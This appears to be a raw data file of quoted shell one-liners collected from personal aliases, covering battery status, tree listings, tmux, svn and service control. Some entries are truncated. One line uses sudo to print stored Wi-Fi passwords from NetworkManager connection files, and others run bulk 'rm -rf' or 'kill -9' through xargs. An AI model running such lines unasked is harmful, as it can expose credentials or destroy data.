"uuidgen | tee ""$(tty)"" | tr -d ""\n"" | pbcopy"
"uptime|cut -dl -f2-|cut -d: -f2-|awk ""{print \"" 1 min load average: \"" \$1 \""\n 5 min load average: \"" \$2 \""\n15 min load average: \"" \$3 \"".\""}"""
"uptime | sed 's/,//g' | cut -f 4-6 -d ' '|
"upower -i `upower -e | grep ""BAT""` | grep -E ""time|percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT1| grep -E ""state|to\ full|percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT1| grep --color=none -E ""state|time\ to|percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT1 | grep -E --color=never ""state|to\ full|percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT1 | grep -E ""state|to\ full|percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0| grep -E ""state|to\ full|percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0| grep -E ""state|to\ empty|percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0| grep -E ""state|time\ to\ full|percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0| grep -E ""state| time\ to\ |percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0| grep --color=never -E ""state|to\ full|percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -E ""state|to\ full|percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -E ""state|time|per"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -E ""state|time\ to|percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -E ""state|time\ to\ full|percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -E ""state|time to empty|percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -E ""state|percentage|to\ full"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -E ""percentage|capacity|time\ to"" "
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep --color=never -E ""percentage|state|to\ full"""
"upower -i $(upower -e | grep BAT) | grep percent | awk ""{ print \$2 }"""
"updatedb && locate -r ""\~$\|#[^/]*#$"" | grep -v /node_modules/ | esc"
"updatedb && locate -r ""\.pac\(new\|save\|orig\)$"" | esc"
"umount -r $(grep -nv ""^lgapp_xip /mnt/lg/lgapp cramfs"" /proc/mounts | grep -v ""^rootfs"" | sort -rn | cut -d"" "" -f2)"
"treef /usr/share/doc/apache2-doc/manual/fr | egrep -v /en/ | egrep -v ""directories,|^$"""
"tree -d -L 10 -I ""vendor|tests|test|node_modules"" --matchdirs"
"tree -d -I ""vendor|cache|log|logs"""
"tree -aC -I "".git|node_modules|bower_components"" --dirsfirst ""$@"" | less -FRNX;"
"tree -aC -I "".git|node_modules|bower_components"" --dirsfirst ""$@"" | less -FRNX"
"tree -a -L 3 -I "".git|node_modules|.DS_Store|vendor"""
"tree -a -I ""bin|Debug|Release|.git"""
"tree -a -I ""\.DS_Store|\.git|node_modules|vendor\/bundle"" -N"
"tree -a -I "".git|.history|node_modules|__pycache__"""
"tree -a -I ""*.git|__pycache__|*.pyc|static"""
"tree -a -C -I ""node_modules|cache|bin|.git"""
"tree -a -C -I ""\.DS_Store|\.git|node_modules|vendor\/bundle"" -N"
"tree -R -aI ""vendor|.git|.github|node_modules"" $1"
"tree -P ""*.rb"" -I ""assets|views|mailers|coverage"" app"
"tree -I ""semantic|node_modules|venv|__pycache__"""
"tree -I ""dist|config|tmp|pandoc"""
"tree -I ""*cache*|*egg-info*|*dist*|*.pyc"""
"tree -Ca -I "".git|.svn|*.pyc|*.swp"""
"tree -C -I ""node_modules|__pycache__|.git|*.pyc"""
"tree -C -I ""*~|*#|node_modules|sprockets"""
"tree -C -I ""*~|*#|node_modules|sprockets"" && echo ""Performing tree recursively, without node modules"""
"tree -C --dirsfirst -I "".git|node_modules|public|build"""
"tree -AC -I "".svn|.git|node_modules|bower_components"""
"tr -cd 0-9 < /dev/urandom | fold -w 78 | perl -e ""while(<>){s/(.{10})/\$1 /g;print;}"" | cat $(echo -e ""\033[0;32m"") -"
"tr -cd 0-9 < /dev/urandom | fold -w 100 | perl -e ""while(<>){s/(.{10})/\$1 /g;print;}"" | cat $(echo -e ""\033[0;32m"") -"
"tr -c ""[:xdigit:]"" "" "" < /dev/urandom | pv -L 10k | dd cbs=$COLUMNS conv=unblock | GREP_COLOR=""1;32"" grep --color ""[^ ]"""
"tr '\n' , | rev | cut -c 2- | rev"
"top -s 0 -l 1 -pid 0 -stats pid | grep '^PhysMem: ' | cut -d : -f 2- | tr ',' '\n'"
"top -l1 | awk ""NR==4 || NR==7 {print}"""
"top -bn1 | grep 'Cpu(s)' | sed 's/.*, *\([0-9.]*\)%* id.*/\1/' | awk '{print 100 - \$1\"
"token=$(tail -n2 <./storage/logs/laravel.log | grep -o "".\{0,0\}reset/.\{0,64\}"" | cut -c7- | tail -n1) && chromium http://localhost:8000/#/set-password/$token"
"tmuxp load $(ls ~/.tmuxp/*.yaml | rg "".*/.tmuxp/"" -r """" | rg ""\.yaml"" -r """" | fzf) --yes"
"tmux lsw -F ""#{window_active} #{window_layout}"" | grep ""^1"" | cut -d "" "" -f2 | copy"
"tmux ls | awk ""{print $1}"" | sed s/:// | xargs -I{} tmux kill-session -t {}"
"tmux ls -F '#S: created #{t:session_created} in #{s|$HOME|~|:pane_current_path} #{?session_attached,[attached],}' 2>/dev/null"
"tmux list-windows -F ""#{windows_name}"" | grep -q logs || tmux neww -n ""logs"" && tmux send-keys -t ""${USER}"" ""cd ~/playground/rajalokan/docker_chowk/docker-apt-cacher-ng; make log"" C-m && tmux splitw -v -t logs && tmux selectp -t 2 && tmux send-keys -t ""${USER}"" ""cd ~/playground/rajalokan/docker_chowk/docker-devpi; make log"" C-m \; selectw -t 1"
"tmux list-windows -F ""#I:#W"" | fzf-tmux | cut -d "":"" -f 1 | xargs tmux select-window -t"
"tmux kill-session -t $(tl | fzf | tr "":"" ""\n"" | head -n1)"
"tmux attach -t $(tl | fzf | tr "":"" ""\n"" | head -n1)"
"tlo ""ERROR|WARN|Exception|Error"""
"time mka recoveryimage 2>&1 | tee /tmp/buildBoot && echo -e ""\007"" || echo -e ""\007"""
"time mka cookies 2>&1 | tee /tmp/buildFull && echo -e ""\007"" || echo -e ""\007"""
"time mka bootimage 2>&1 | tee /tmp/buildBoot && echo -e ""\007"" || echo -e ""\007"""
"test -d google3 && echo google3 || pwd | sed ""s,^\(.*\)google3.*$,\1google3,"""
"test -d .svn/ && echo ""(rv$(svn info | grep ""Revision"" | cut -d: -f2 | sed s/\ //g))"""
"test $(php -m | grep xdebug) && xdebug-disable && echo ""xdebug disabled"" || (xdebug-enable && echo ""xdebug enabled"")"
"terminal-notifier -title ""$([ $? = 0 ] && echo done || echo fail)"" -message ""$(history|tail -n1)"""
"tempmonitor -c -ds -a | head -12 | tail -1 | cut -d "" "" -f 1"
"telegram-send ""$([ $? = 0 ] && echo """" || echo ""error: "") $(echo $history[$HISTCMD]|sed -e "
"tail -f log/development.log | grep -vE ""(^$|asset|^DEPRE)"""
"tail -f /var/log/mail.log | fgrep -v 'connect from localhost.localdomain[127.0.0.1]' | fgrep -v 'disconnect from localhost.localdomain[127.0.0.1]' | fgrep -v 'dovecot: imap-login: Aborted login (no auth attempts): rip=127.0.0.1, lip=127.0.0.1, secured'"
"tail -50f ${ODIAG}/diag/`[[ ${OSID} == *""+ASM""* ]] && echo ""asm"" || echo ""rdbms""`/`echo ${OSID%[0-3]} |tr "
"tail -50f ${!ODIAG}/diag/`[[ ${!OSID} == *""+ASM""* ]] && echo ""asm"" || echo ""rdbms""`/`echo ${!OSID%[0-9]} |tr "
"tac ~/.bash_history >> ~/Desktop/hist2 ; sort -u ~/Desktop/hist2 > ~/Desktop/hist ; tac ~/Desktop/hist | peco | tr -d ""\n"" | xclip "
"tac /var/log/pacman.log | sed -rn ""/\[PACMAN\]/q;/installed|updated/p"" | tac"
"tabview ""$(fd csv | fzf --preview ""cat {} | head -20 | column -ts,"")"""
"t | grep -Poh ""\@\w+"" | sort | uniq -u"
"t | grep -Poh ""\+\w+"" | sort | uniq -u"
"t ""\b(WARN|SEVERE|ERROR|FATAL)\b"""
"systemctl list-timers coopdoor-morning.timer | grep coopdoor | cut -f3 -d"" "" | cut -f1-2 -d:"
"systemctl list-timers coopdoor-evening.timer | grep coopdoor | cut -f3 -d"" "" | cut -f1-2 -d:"
"system_profiler SPUSBDataType | sed -n -e ""/iPad/,/Serial/p"" -e ""/iPhone/,/Serial/p"" | grep ""Serial Number:"" | awk -F "": "" ""{print $2}"""
"system_profiler SPFireWireDataType | grep ""BSD Name: disk.$"" | sed ""s/^.*: //"" | (while read i; do /usr/sbin/diskutil unmountDisk $i; done)"
"system_profiler SPFireWireDataType | grep ""BSD Name: disk.$"" | sed ""s/^.*: //"" | (while read i; do /usr/sbin/diskutil mountDisk $i; done)"
"sysctl -a |egrep ""sleeptime|waketime|boottime"""
"svncolor status | grep ""^\?"" | awk ""{print \$2}"" | xargs svn add"
"svncolor status | grep ""^\!"" | awk ""{print \$2}"" | xargs svn delete"
"svn st|grep -E ""M |C |A """
"svn stat|grep -v ""^\?|\.(dat|ind)$"""
"svn status | grep -e ""^\\!"" | sed -e ""s/^\\!\\s\\+//"" | xargs svn rm"
"svn status | grep ""^\\?"" | awk ""{print \\$2}"" | xargs svn add"
"svn status | grep ""^\?"" | awk ""{print \$2}"" | xargs svn add"
"svn status | grep ""^\?"" | awk ""{print \$2}"" | xargs -I {} svn add {}@"
"svn status | grep ""^\?"" | awk ""{print $2}"" | xargs svn add"
"svn status | grep ""^\!"" | sed ""s/! *//"" | xargs -I% svn rm %"
"svn status | grep ""^\!"" | awk ""{print \$2}"" | xargs svn delete"
"svn status | grep ""^\!"" | awk ""{print \$2}"" | xargs svn del"
"svn status | grep ""^!"" | awk ""{print $2}"" | xargs svn delete"
"svn status | grep ""\!"" | awk ""{print $2;}"" | xargs svn rm"
"svn status --no-ignore | grep ""^\?"" | sed ""s/^\? //"" | xargs -Ixx rm -rf xx"
"svn stat | grep ""^\?"" | awk ""{print \$2}"" | xargs svn add"
"svn stat | grep ""^\!"" | awk ""{print \$2}"" | xargs svn delete"
"svn st |grep -v external |grep -v ""^\s*X"" |grep -v ""^\s*$"""
"svn st | grep ^[AM] | sed ""s/[AM] *//"" | xargs tar -cvzf changes.tar.gz"
"svn st | grep ^! | awk ""{print \\"" --force \\""$2}"" | xargs svn rm"
"svn st | grep . | grep -v ""^[?X]"" | grep -v ""Performing status"""
"svn st | grep ""^\?"" | awk ""{print \$2}"" | xargs svn add"
"svn st | grep ""^\?"" | awk ""{print \$2}"" | xargs svn add $1'"
"svn st | grep ""^\?"" | awk ""{print \$2}"" | xargs svn add $1"
"svn st | grep ""^\!"" | awk ""{print \$2}"" | xargs svn rm $1"
"svn st | grep ""^M "" | grep -o ""[^ ]*$"" | xargs svn revert"
"svn st | grep ""^? "" | grep -o ""[^ ]*$"" | xargs svn add"
"svn st | grep ""?"" | awk ""{ print \$2 }"" | xargs -i svn add {}"
"svn st | grep ""? "" | sed ""s/? *//"" | xargs svn add"
"svn st | grep ""!"" | awk ""{ print \$2 }"" | xargs -i svn rm {}"
"svn st . | egrep ""^\?"" | cut -d\? -f2 | xargs rm -rf \{}"
"svn st -q | grep ""^[A,M,?,\!] .*\.php"" | sed -e ""s/^[A,M] *//g"" | xargs -n1 php -l"
"svn st --no-ignore | grep ""^[I?]"" | awk ""{print $2}"" | xargs rm -rf"
"svn pl -R ./ | grep ""svn:"" | sort | uniq -c"
"svn log `svn info | sed -n 2p | sed ""s/^URL: \(.*\)/\1/""` | vimsvnlog -R -"
"svn log -v `svn info | sed -n 2p | sed ""s/^URL: \(.*\)/\1/""` | vimsvnlog -R -"
"svn info | grep URL | cut -d "" "" -f 2- | xargs open"
"svn diff -r`(svn info | grep Revision | cut -d"" "" -f2)`:HEAD | colordiff"
"sv status | grep ""^\?"" | awk ""{print \$2}"" | xargs svn add"
"sv status | grep ""^\!"" | awk ""{print \$2}"" | xargs svn delete"
"sudo zypper clean -a; sudo zypper ref -f; sudo zypper up -yl; sudo zypper dup -yl; sudo zypper patch -yl; zypper packages --unneeded | awk -F\| 'match(\$1,/^i/){print \$3}' | xargs sudo zypper rm -yu"
"sudo zsh -c ""grep psk= /etc/NetworkManager/system-connections/* | sed \""s/.*\\///g\"" | sed \""s/:psk=/\tPassword: /\"" | expand -t 25"""
"sudo tail -f /var/log/httpd/access_log /var/log/httpd/error_log | egrep -v ""favicon|^==|^$"""
"sudo sudo sudo sudo sudo sudo sudo sudo pip freeze --local | grep -v ""^\-e"" | cut -d = -f 1 | xargs -n1 pip install -U"
"sudo smartctl -a /dev/sda | egrep ""Cycle|Power|Temp"""
"sudo service postgresql-9.4 stop; ps aux | ack ""postgres"" | awk ""{print \$2}"" | xargs kill -9"
"sudo service nginx stop; ps aux | ack ""nginx"" | awk ""{print \$2}"" | xargs kill -9"
"sudo service mysql stop; ps aux | ack ""mysql"" | awk ""{print \$2}"" | xargs kill -9"
"sudo service mongodb stop; ps aux | ack ""mongod"" | awk ""{print \$2}"" | xargs kill -9"
"sudo service docker stop; ps aux | ack ""docker"" | awk ""{print \$2}"" | xargs kill -9"
"sudo service --status-all | grep - -v ""?"" | grep "" + "" && sudo service --status-all | grep "" - "" "
"sudo sed -i ""s|https://manjaro.org/|about:home|1"" /usr/lib/firefox/distribution/distribution.ini"
"sudo sed -i ""s|Exec=|Exec=env MOZ_USE_XINPUT2=1 |g"" /usr/share/applications/firefox.desktop"
"sudo pkill -INT -f ""openconnect|openvpn|vpnc|snx"""
"sudo pacman -Qi | awk '/^Name/{name=\$3} /^Installed Size/{print \$4\$5, name}' | sort -hr | sed '20'"
"sudo ngrep -d \$(ip -o link show | awk '{print \$2,\$9}' | grep UP | cut -f1 -d \"
"sudo netstat -nlpt| grep tcp | grep -Ev ""127\.0\.0\.1|[^a-f0-9]::1"""
"sudo mount -o gid=disk,dmask=007,fmask=117 /dev/""`dmesg | grep -o ""\\[[a-z1-9]*\\]"" | tail -n 1 | tr -d []`""1 /mnt/disk"
"sudo lsof -ni | grep --color=never LISTEN | egrep --color=auto ""^[^ ]+|:\w+"""
"sudo lsof -i | awk ""/LISTEN/ || NR==1"" "
"sudo lsof -P -i -n | cut -f 1 -d "" ""| uniq | tail -n +2"
"sudo kill `ps aux | grep ""eth0"" | grep -v ""grep"" | ssc 2` 2>/dev/null; \
"sudo kill `ps -ax | grep coreaudiod | grep sbin | awk ""{print $1}""`"
"sudo kill -9 $(ps -ef | grep sbcl | grep -v grep | awk ""{print \$2}"")"
"sudo iw wlan0 scan | grep -o ""SSID:.*"" | cut -d "" "" -f 2 | sort -iu"
"sudo iw dev $DEVICE scan | egrep ""SSID|signal|\(on"""
"sudo ifconfig | grep -Eo 'inet (ad{1,2}r:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'"
"sudo ifconfig | grep -Eo ""inet (addr:)?([0-9]*\.){3}[0-9]*"" | grep -Eo ""([0-9]*\.){3}[0-9]*"" | grep -v ""127.0.0.1"" && wget http://ipinfo.io/ip -qO -"
"sudo ifconfig eth0 | grep ""inet addr"" | cut -f2 -d"":"" | cut -f1 -d"" """
"sudo ifconfig -a | grep -o 'inet6\\? \\(addr:\\)\\?\\s\\?\\(\\(\\([0-9]\\+\\.\\)\\{3\\}[0-9]\\+\\)\\|[a-fA-F0-9:]\\+\\)' | awk '{ sub(/inet6? (addr:)? ?/, \"
"sudo ifconfig -a | grep -o 'inet6\\? \\(addr:\\)\\?\\s\\?\\(\\(\\([0-9]\\+\\.\\)\\{3\\}[0-9]\\+\\)\\|[a-fA- F0-9:]\\+\\)' | awk '{ sub(/inet6? (addr:)? ?/, \"
"sudo ifconfig -a | grep -o 'inet6\? \(addr:\)\?\s\?\(\(\([0-9]\+\.\)\{3\}[0-9]\+\)\|[a-fA-F0-9:]\+\)' | awk '{ sub(/inet6? (addr:)? ?/, \"
"sudo ifconfig -a | grep -Eo 'inet6?(\sad{1,2}r)?:\s?((([0-9]+.){3}[0-9]+)|[a-fA-F0-9:]+)' |
"sudo gem list | cut -d"" "" -f1 > gem_list.txt ; cat gem_list.txt | xargs sudo gem uninstall -aIx ; cat gem_list.txt | xargs sudo gem install"
"sudo find /var/log/httpd/ -iname ""*error**log"" | xargs sudo tail -f | sed -u ""s/\\\n/\\n/g"" | sed -u ""s/\\\t/\\t/g"" "
"sudo find /var/log/httpd/ -iname ""*access*log"" | xargs sudo tail -f | sed -u ""s/\\\n/\\n/g"" | sed -u ""s/\\\t/\\t/g"" "
"sudo find /data/trash/udcCache/http/hgdownload.soe.ucsc.edu/gbdb/ -type f | egrep -v ""bitmap"" | sed -e ""s/\/sparseData//"" | sed -e ""s#/data/trash/udcCache/http/hgdownload.soe.ucsc.edu/##"""
"sudo find /data/trash/udcCache/http/hgdownload.cse.ucsc.edu/gbdb/ -type f | egrep -v ""bitmap"" | sed -e ""s/\/sparseData//"" | sed -e ""s#/data/trash/udcCache/http/hgdownload.cse.ucsc.edu/##"""
"sudo fdisk -l | grep ""sd[bcde]"" && echo ""================= MOUNTED ================="" && mount|grep ""sd[bcde]""|awk ""{print \$1 \"" ==> \"" \$3}"""
"sudo echo $(ps -axfm -o ""rss"" | cut -c 66-80 | awk ""FNR>1"" | awk -F: ""{total+=\$1} END{print total}"")KB memory used."
"sudo docker ps -a | grep Exit | cut -d "" "" -f 1 | xargs sudo docker rm"
"sudo dnf install $(comm -23 <(sort $HOME/.dotfiles/fedora_worldfile) <(rpm -qa --queryformat ""%{NAME}\n"" | sort | uniq) | peco)"
"sudo df -P | grep /dev/root | tr -s "" "" "" "" | cut -d "" "" -f 5"
"sudo df -P | grep /dev/root | tr -s "" "" "" "" | cut -d "" "" -f 4"
"sudo df -P | grep /dev/root | tr -s "" "" "" "" | cut -d "" "" -f 3"
"sudo df -P | grep /dev/root | tr -s "" "" "" "" | cut -d "" "" -f 2"
"sudo cat /proc/cpuinfo | grep Serial | tr -d "" "" | cut -d "":"" -f 2"
"sudo cat /proc/cpuinfo | grep Hardware | tr -d "" "" | cut -d "":"" -f 2"
"sudo cat /etc/cups/cupsd.conf | grep -i ""Listen localhost"" | cut -d"":"" -f 2 | xargs -I {} $BROWSER ""localhost:{}"""
"sudo apt-get update && sudo apt-get dist-upgrade && sudo pip freeze --local | grep -v ""^\-e"" | cut -d = -f 1 | xargs -n1 pip install -U"
"sudo apt-get purge $( dpkg --list | grep -P -o ""linux-image-\d\S+"" | grep -v $(uname -r | grep -P -o "".+\d"") )"
"sudo apt-get autoremove --purge && sudo apt-get clean && dpkg -l |grep ^rc |awk ""{print \$2}"" |sudo xargs dpkg -P"
"sudo apt-get autoremove --purge && sudo apt-get clean && dpkg -l |grep ^rc |awk ""{print \$2}"" |sudo xargs -r dpkg -P"
"sudo apt-get -y install `cat ~/.bash_history | tail -n 1 | sed -e ""s/^\(\w\+\).*/\1/""` && cat ~/.bash_history | tail -n 2"
"sudo `cat $HISTFILE | tail -n2 | head -n1 | cut -d "";"" -f 2`"
"sudo /sbin/ifconfig -a | grep -o 'inet6\\? \\(addr:\\)\\?\\s\\?\\(\\(\\([0-9]\\+\\.\\)\\{3\\}[0-9]\\+\\)\\|[a-fA-F0-9:]\\+\\)' | awk '{ sub(/inet6? (addr:)? ?/, \"
"sudo $(history | tail -n 2 | head -n 1 | sed -e ""s/^[ ]*[0-9]*[ ]*//g"")"
"sudo $(history | tail -1 | awk ""{\$1=\""\"";print}"" | xargs)"
"sudo $( (alias ""$1"" 2>/dev/null || echo ""$1"") | cut -d\"
"subl $(git status |grep ""modified:""|sed -e ""s/modified://g""|peco)"
"subl $(git diff --name-status $(git rev-parse --abbrev-ref HEAD) $(git merge-base $(git rev-parse --abbrev-ref HEAD) master) | grep ""^[MD]"" | while read line; do echo $(pwd)""/""${line:2}; done | tr ""\n"" "" "")"
"su -c ""$(history | tail -n 2 | head -n 1 | sed -e ""s/^[ ]*[0-9]*[ ]*//g"")"""
"strings -- '$1' | egrep '^[A-Z0-9_]{3,12}$' | grep -v '^[a-z]{2,}$' | egrep -v '^[0-9]'"
"stat -f ""%m%t%Sm %N"" /tmp/__shutdown.log /tmp/aacfoser /tmp/aafmweza /tmp/aagufnog /tmp/aaizcrxv /tmp/aascfjzo /tmp/aatfodmi_deadlock_test_8_seq.ir /tmp/aatrgfij /tmp/aaukbfsv /tmp/aaxztyok /tmp/aayiejvq /tmp/aayiijyc /tmp/aazkftwt_semantics.var.alt.null.ir /tmp/abc /tmp/abgyavuv /tmp/ablilblp /tmp/abnvusth /tmp/abpfnvyf /tmp/absqzefu /tmp/acdgfwfh /tmp/acexihul /tmp/achkfuvq /tmp/achknolg /tmp/acmxvtes /tmp/acoaxtkc /tmp/acujzgpv /tmp/acwzmiws /tmp/acyxyivi /tmp/adasjokt /tmp/adaxljzq /tmp/adewisqu /tmp/adjhqsuq /tmp/adkppbvl /tmp/adswuesi_deadlock_test_8_seq.ir /tmp/advjsaxu /tmp/adziwiwj /tmp/aebbljjg /tmp/aefxenht /tmp/aerjjdeb /tmp/afbudkxy /tmp/afejyrkn /tmp/affvtxdy /tmp/afgtnuwg /tmp/afgvdmal /tmp/afkvsksf /tmp/afnzgmno_hello-world.ir /tmp/afobmhuu /tmp/afwaulhe /tmp/agalplhf /tmp/agbmnwiu /tmp/aghxxjbe /tmp/agmfsaxl /tmp/agpayaxu /tmp/agxwttpq /tmp/agxxqhgy /tmp/ahajbote /tmp/ahdaxqgo /tmp/ahdyrfby_minimal_grep_2_seq.ir /tmp/ahdzyixg /tmp/ahfxzlfk /tmp/ahigbcpf /tmp/ahirscew /tmp/ahiydsrb /tmp/ahrtsvsh /tmp/ahsrjaww_scr.ir /tmp/aidurbpx /tmp/aiezhcwo_semantics.tilde.colon.ir /tmp/aifqksln_builtin.eval.break.ir /tmp/aigiysan /tmp/aijjxbba /tmp/aipvrshx /tmp/aisgxprz /tmp/aixmmhyx /tmp/aiyjuasd /tmp/ajcstxpz_bigrams_2_seq.ir /tmp/ajfvcamv /tmp/ajiimvzc /tmp/ajlesrpe /tmp/ajqbxyhn /tmp/ajqjwtfi /tmp/ajrmynev /tmp/ajvcqgel /tmp/akbqtblk /tmp/akbyegpp /tmp/akdlayzn /tmp/akibfutn_builtin.dot.unreadable.ir /tmp/akkvgavn /tmp/aksujddl /tmp/akulvggx /tmp/albmtogb /tmp/alcvrjwy /tmp/alheempw /tmp/aliewevg /tmp/allhqxax /tmp/alnrrhlt /tmp/alxomfyl /tmp/alxrziou /tmp/alyyjair /tmp/amdskcuh /tmp/amfzyeiz /tmp/amgcjczr /tmp/amgokwxa /tmp/amhkobyx_minimal_grep_2_seq.ir /tmp/amkgbtca /tmp/amlwcusp /tmp/amrinhpx /tmp/amrngcnz /tmp/amzxhqwr /tmp/anfpmfdm /tmp/anwkhrjy /tmp/anztslyh /tmp/anzzjwhv /tmp/aoevmyqw /tmp/aogmgdvl_comm-par-test_2_seq.ir /tmp/aolxlvet /tmp/aoszaquu /tmp/aovjfbpu /tmp/aowzjptv /tmp/aoxbdhhi /tmp/apctuyjm /tmp/apdjxcot /tmp/apmzayck /tmp/apnqczev /tmp/aptjuxal /tmp/apwdgjdz /tmp/aqagjyxv /tmp/aqagulhs /tmp/aqdwsocg /tmp/aqehezsr /tmp/aqhtnads /tmp/aqiggdie /tmp/aqkindai /tmp/aqqmjkjj /tmp/aqseckgv /tmp/aqsyehnk /tmp/aqtntnyu /tmp/aqvmnvrm /tmp/aqzloygl /tmp/arhbjwuj /tmp/arippwea /tmp/arjoqxup /tmp/arkdqzbn /tmp/armmnskk /tmp/arqhwcev /tmp/artjirrx /tmp/arupgsdy /tmp/arvbrvwm /tmp/arwfuinc /tmp/arylexfe /tmp/arywjdlc /tmp/arzhlvsk /tmp/asafpxqj /tmp/asboouqt /tmp/asdtnyna /tmp/asgdcgbh /tmp/aslgmgrw /tmp/asnrwgla /tmp/aspukdxz /tmp/asqyqfpn /tmp/asrryvvi /tmp/asubinub /tmp/asvkoofs /tmp/asypuxqd /tmp/atdfcrbc /tmp/atlgjjyw /tmp/atmakpxr /tmp/atzjjonu /tmp/auabbywk_set-diff_2_seq.ir /tmp/aubuvdwb /tmp/aucynduu /tmp/aufpnefe /tmp/augqecgx /tmp/aujprbim /tmp/aulbhsan /tmp/auotztgt /tmp/aupugsth_builtin.set.-m.ir /tmp/austycrg /tmp/auyopgfr /tmp/auyxnutz /tmp/avlkoonl /tmp/avllpbhk /tmp/avmgnnwv /tmp/avmgtrtr /tmp/avpevigp /tmp/avpjszdw /tmp/avrnheyt /tmp/avvikphb /tmp/avzjidzv /tmp/awaefqun /tmp/awdsftce /tmp/awesyczg_hello-world.ir /tmp/awgisatq /tmp/awgvnmnp /tmp/awjqnyaf_diff_8_seq.ir /tmp/awnwmnau /tmp/awuvbfzh /tmp/axgjcdvo /tmp/axhdpdqw /tmp/axhrhrkj /tmp/axiexvhq /tmp/axujjagg /tmp/axulkzqx /tmp/aybyndjh /tmp/aygazlsw /tmp/ayksqrus /tmp/aymywmbd /tmp/ayowajjv /tmp/azecdllo /tmp/azeowpee /tmp/azkbxacn /tmp/azquyexq /tmp/azvruvua /tmp/azzillhr /tmp/baawyuwk /tmp/baewkrev /tmp/bagmttmp /tmp/baiiixtc /tmp/baqdwhfs /tmp/bargnovb /tmp/bauoyfkh /tmp/bbdqaojy /tmp/bbtxyiqj /tmp/bbuytlvl /tmp/bbwklkir /tmp/bbzhizuk /tmp/bbzjtloo /tmp/bcakoazc /tmp/bcbzqyjp /tmp/bcfmbxaf /tmp/bcjprwgb /tmp/bclyuvvj /tmp/bcmechwf /tmp/bcqmprcs /tmp/bcqpgcdx /tmp/bcsswfba /tmp/bcwyjirl /tmp/bcxudbav /tmp/bczlvwta /tmp/bdhgbzwd /tmp/bdinlgwd_scr.ir /tmp/bdjoxadc /tmp/bdldmplm_semantics.backtick.exit.ir /tmp/bdnhrxst /tmp/bdnlnmfi /tmp/bdohsivx /tmp/bdppxwap /tmp/bdrbjmul_semantics.noninteractive.expansion.exit.ir /tmp/bdsrmdre /tmp/bdzmirlf /tmp/beextocf /tmp/beghyxas /tmp/begxcref /tmp/beiufxyj /tmp/bemaouaj /tmp/bepkfvmi_builtin.export.unset.ir /tmp/bernrnkn /tmp/besekqma /tmp/beueubqx_hello-world.ir /tmp/bfcdtcbz /tmp/bfhnkzjn /tmp/bflyecvk /tmp/bfpgfkcx /tmp/bfqjvziv /tmp/bfvpyrbl /tmp/bfzzqrig /tmp/bgwredqd /tmp/bgxeqqqg /tmp/bgzlnbwy /tmp/bhdadqja /tmp/bhddmyoz /tmp/bhezvcgz /tmp/bhixmujq /tmp/bhjnbyiv /tmp/bhmhtzzg /tmp/bhnilxtz /tmp/bhpbzrdi /tmp/bifrltzx /tmp/bihbvwru /tmp/biicxgps /tmp/biippfyw /tmp/bikrqvvq /tmp/biptwzkj /tmp/bitvtcsw /tmp/biuiqgii /tmp/biyzbcqy /tmp/bjcdjgba /tmp/bjfuhjfq /tmp/bjlxcbdg /tmp/bjnpilhl /tmp/bjopcgdk /tmp/bjosdddu /tmp/bjotfosb /tmp/bjrxzsfz /tmp/bjukypjr /tmp/bjxqpyqo /tmp/bjzeloqi /tmp/bkahomrr /tmp/bkctufgu /tmp/bkfhikeh /tmp/bkfldssy /tmp/bkipciib /tmp/bkkoxpcx /tmp/bkmdecuu /tmp/bkqmamww /tmp/bkrskspz /tmp/bktgaklz /tmp/bkvbxgxj /tmp/blayxlvx /tmp/bldwxrbc /tmp/blemoxyw /tmp/blgmkxsr /tmp/blionkio /tmp/blmukjid /tmp/blurtcwx_semantics.splitting.ifs.ir /tmp/blxabatt /tmp/bmluzwae /tmp/bmnqhoup /tmp/bmsugpbl /tmp/bmulrrzu /tmp/bmzpbrnw_semantics.-C.ir /tmp/bmzplxvq /tmp/bngbfxgm /tmp/bngjjbck /tmp/bnhejsta /tmp/bnmcdrjd /tmp/bnruuyit /tmp/boerxyzm /tmp/boeyancz /tmp/bokhjrde /tmp/bolsxxuv /tmp/boofmkaq_semantics.fun.error.restore.ir /tmp/bopxjzug /tmp/bosscokz /tmp/bowcjcjc /tmp/bpdbhstk /tmp/bpjpwsle /tmp/bpkkipti /tmp/bpkntvpt /tmp/bppokmfn /tmp/bpsixhtb /tmp/bpyqyqpd /tmp/bqndhkcf /tmp/bqocktsb /tmp/braqegzo_bigrams_8_seq.ir /tmp/brdryraz /tmp/brdxpiox /tmp/brkjqeiz /tmp/brnmmoxv /tmp/bruqeqne /tmp/bsatshhx /tmp/bscfdqmp /tmp/bscsaluv /tmp/bsdoebwa /tmp/bsecjltt /tmp/bsethlwt /tmp/bsftiorw /tmp/bsjgzsam /tmp/bsjjpnxw /tmp/bslveohk /tmp/bsmeonwm /tmp/bsrhqhjm /tmp/bsubhadb /tmp/bswvahju /tmp/bsyptwug /tmp/btguztum /tmp/bthhkxkb /tmp/btioxgom /tmp/btkvyjey_semantics.command-subst.ir /tmp/btmtwaix /tmp/btnnyiro_semantics.subshell.redirect.ir /tmp/btpnvkmm /tmp/btsthdat /tmp/bttdqdvz /tmp/bttyqdws_scr.ir /tmp/bucitmwo /tmp/buhnbklf /tmp/buiyappz /tmp/bumjyfvc /tmp/buvwnbqy /tmp/buzyseap /tmp/bvaikdwj /tmp/bveqbdmv /tmp/bvhhxgne_topn_2_seq.ir /tmp/bvjthgnt /tmp/bvkhwvpn /tmp/bvmvkzoe /tmp/bvwjdcnn /tmp/bvwjptia 